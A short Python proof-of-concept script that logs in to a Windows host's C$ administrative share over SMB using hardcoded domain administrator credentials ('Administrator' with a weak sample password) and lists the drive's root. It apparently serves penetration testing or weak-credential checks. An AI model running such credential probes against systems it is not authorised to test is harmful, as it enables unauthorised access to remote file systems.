import tempfile
from smb.SMBConnection import SMBConnection
import subprocess
import smbclient
def smb_account_poc(username,password,domain,ipaddress):
    
    try:
        smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
        exploit_folder = smb.listdir('/')
        return exploit_folder
    except:
        exploit_folder = "NULL"
        return exploit_folder

smb_account_poc('Administrator','1qaz@WS','alex-ad.local',"192.168.89.214")
